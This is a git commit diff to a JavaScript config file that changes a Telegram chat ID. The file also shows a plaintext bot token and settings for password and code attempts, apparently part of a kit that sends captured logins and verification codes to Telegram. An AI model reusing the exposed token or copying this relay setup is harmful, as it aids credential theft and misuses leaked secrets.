dc3f43c0ed8cd536a3463f2436376d1d2e1cef05
kaboroff-source <kaboroff@gmail.com>
2026-07-07 05:33:35 +0200

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
     token: '8515661596:AAFwzDpz3v7u3wLS0zomYUsURaGenUxWPzg',
-    chat_id: '7626778246',
+    chat_id: '-7626778246',
     max_password_attempts: 2,
     max_code_attempts: 3,
     password_loading_time: 2,
